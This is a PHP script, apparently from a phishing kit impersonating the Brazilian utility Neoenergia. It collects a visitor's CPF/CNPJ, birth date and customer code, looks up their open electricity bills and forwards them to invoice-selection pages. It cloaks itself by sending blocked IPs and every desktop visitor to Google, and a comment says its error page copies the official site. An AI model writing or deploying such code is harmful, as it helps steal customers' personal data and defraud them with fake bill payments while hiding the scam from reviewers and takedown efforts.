<?php
require_once __DIR__ . '/config.php';

// =============================================
// REGRAS DE ACESSO (público)
// - IP bloqueado -> Google
// - Desktop -> Google (site PHP é só celular)
// =============================================
enforceIpNotBlocked();
enforceMobileOnly();

addSecurityHeaders();

// Receber parâmetros
$estado = isset($_REQUEST['estado']) ? sanitize($_REQUEST['estado']) : '';
$cpfCnpj = isset($_REQUEST['cpfCnpj']) ? sanitize($_REQUEST['cpfCnpj']) : '';
$nascimento = isset($_REQUEST['nascimento']) ? sanitize($_REQUEST['nascimento']) : '';
$codigoCliente = isset($_REQUEST['codigoCliente']) ? sanitize($_REQUEST['codigoCliente']) : '';
$tipoIdentificacao = isset($_REQUEST['tipo_identificacao']) ? sanitize($_REQUEST['tipo_identificacao']) : 'nascimento';

// Limpar CPF/CNPJ
$documentoDigits = preg_replace('/\D/', '', $cpfCnpj);
$isCnpj = strlen($documentoDigits) === 14;

// IMPORTANTE: Limpar dados de sessão anteriores antes de nova consulta
// Isso garante que cada CPF mostre apenas suas próprias UCs
$cpfAtual = $_SESSION['identificador'] ?? '';
if ($cpfAtual !== $documentoDigits) {
    // CPF diferente, limpar toda a sessão de faturas/UCs
    unset($_SESSION['faturas']);
    unset($_SESSION['unidades_consumidoras']);
    unset($_SESSION['uc_selecionada']);
    unset($_SESSION['protocolo']);
    unset($_SESSION['identificador']);
    unset($_SESSION['estado']);
}

// Preparar dados para API
$usaCodigoCliente = $isCnpj || $tipoIdentificacao === 'codigo';

// A API espera nascimento no formato DD/MM/AAAA - NÃO converter

// Chamar API de consulta de faturas
$apiUrl = 'https://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['SCRIPT_NAME']) . '/api/consultar_faturas.php';

$postData = [
    'estado' => $estado,
    'cpf' => $documentoDigits,           // A API usa 'cpf' ou 'documento'
    'documento' => $documentoDigits,     
    'nascimento' => $nascimento,          // Formato DD/MM/AAAA
    'codUc' => $codigoCliente,            // A API usa 'codUc' ou 'codigo'
    'codigo' => $codigoCliente
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $apiUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 120); // Aumentar timeout para 2 minutos
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

// Debug
error_log("consulta.php - Response HTTP: $httpCode");
error_log("consulta.php - Response: " . substr($response, 0, 500));
if ($curlError) {
    error_log("consulta.php - cURL Error: $curlError");
}

$result = json_decode($response, true);
$error = '';
$faturas = [];
$unidadesConsumidoras = [];

if ($curlError) {
    $error = 'Erro de conexão. Tente novamente.';
} elseif ($httpCode !== 200 || !$result) {
    $error = 'Erro ao consultar faturas. Tente novamente.';
} elseif (isset($result['error'])) {
    $error = $result['error'];
} elseif (isset($result['retorno']['mensagem']) && $result['retorno']['mensagem'] !== 'OK') {
    // Tratar erro da API Neoenergia
    $msg = strtolower($result['retorno']['mensagem']);
    $msgOriginal = $result['retorno']['mensagem'];
    
    // Erros de sistema/API (exceções Java, timeout, erro interno) - redirecionar para página de erro do sistema
    if (strpos($msg, 'exceção') !== false || 
        strpos($msg, 'exception') !== false || 
        strpos($msg, 'java.lang') !== false ||
        strpos($msg, 'erro interno') !== false ||
        strpos($msg, 'timeout') !== false ||
        strpos($msg, 'numberformatexception') !== false ||
        strpos($msg, 'nullpointerexception') !== false ||
        strpos($msg, 'serviço indisponível') !== false ||
        strpos($msg, 'service unavailable') !== false ||
        strpos($msg, 'erro de sistema') !== false) {
        
        // Registrar erro na API de status
        $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
        $statusUrl = $scheme . $_SERVER['HTTP_HOST'] . dirname($_SERVER['SCRIPT_NAME']) . '/api/api_status.php';
        $ch = curl_init($statusUrl);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode(['action' => 'error', 'error' => $msgOriginal]),
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_TIMEOUT => 5,
        ]);
        curl_exec($ch);
        curl_close($ch);
        
        // Redirecionar para página de erro do sistema (igual ao site oficial)
        header("Location: erro_sistema.php");
        exit;
    }
    
    // Se não encontrou faturas/cliente, redirecionar para tela de "sem faturas"
    if (strpos($msg, 'não encontrad') !== false || 
        strpos($msg, 'não existe') !== false || 
        strpos($msg, 'nenhuma fatura') !== false ||
        strpos($msg, 'sem fatura') !== false ||
        strpos($msg, 'não há fatura') !== false ||
        strpos($msg, 'não possui fatura') !== false) {
        header("Location: sem_faturas.php?cpf=" . urlencode($documentoDigits));
        exit;
    }
    
    // Se dados inválidos ou inexistentes, redirecionar para tela de "sem faturas" (cliente não existe)
    if (strpos($msg, 'inválido') !== false || 
        strpos($msg, 'inexistente') !== false || 
        strpos($msg, 'precisa ser preenchida') !== false ||
        strpos($msg, 'não cadastrad') !== false) {
        header("Location: sem_faturas.php?cpf=" . urlencode($documentoDigits));
        exit;
    }
    
    // Outros erros: mostrar mensagem genérica
    $error = $result['retorno']['mensagem'];
} elseif (isset($result['faturasAbertas'])) {
    // Salvar protocolo da resposta
    $protocolo = $result['retorno']['protocolo'] ?? $result['protocolo'] ?? '';
    if (!empty($protocolo)) {
        $_SESSION['protocolo'] = $protocolo;
    }
    
    // Filtrar faturas vinculadas (sem código de barras)
    $faturas = array_filter($result['faturasAbertas'], function($f) {
        return !isset($f['statusFatura']) || $f['statusFatura'] !== 'vinculada';
    });
    $faturas = array_values($faturas);
    
    // Extrair unidades consumidoras únicas
    $ucs = [];
    foreach ($faturas as $fatura) {
        $codigo = $fatura['uc'] ?? $fatura['codigoUC'] ?? $fatura['codigo_uc'] ?? '';
        $endereco = $fatura['endereco'] ?? '';
        if ($codigo && !isset($ucs[$codigo])) {
            $ucs[$codigo] = [
                'codigo' => $codigo,
                'endereco' => $endereco
            ];
        }
    }
    $unidadesConsumidoras = array_values($ucs);
}

// Se tiver erro, voltar para a página anterior
if ($error) {
    header("Location: index.php?step=identificacao&estado=" . urlencode($estado) . "&cpf=" . urlencode($cpfCnpj) . "&error=" . urlencode($error));
    exit;
}

// Se não tiver faturas
if (empty($faturas)) {
    header("Location: sem_faturas.php?cpf=" . urlencode($documentoDigits));
    exit;
}

// Se tiver apenas uma UC, ir direto para seleção de faturas
if (count($unidadesConsumidoras) <= 1) {
    $_SESSION['faturas'] = $faturas;
    $_SESSION['identificador'] = $documentoDigits;
    $_SESSION['estado'] = $estado;
    if (!empty($unidadesConsumidoras)) {
        $_SESSION['uc_selecionada'] = $unidadesConsumidoras[0]['codigo'];
    }
    header("Location: selecionar_fatura.php");
    exit;
}

// Se tiver múltiplas UCs, mostrar seleção
$_SESSION['faturas'] = $faturas;
$_SESSION['identificador'] = $documentoDigits;
$_SESSION['estado'] = $estado;
$_SESSION['unidades_consumidoras'] = $unidadesConsumidoras;

// Passar estado/cpf também por query para o "Voltar" não depender de sessão/cookie
header("Location: selecionar_uc.php?estado=" . urlencode($estado) . "&cpf=" . urlencode($documentoDigits));
exit;
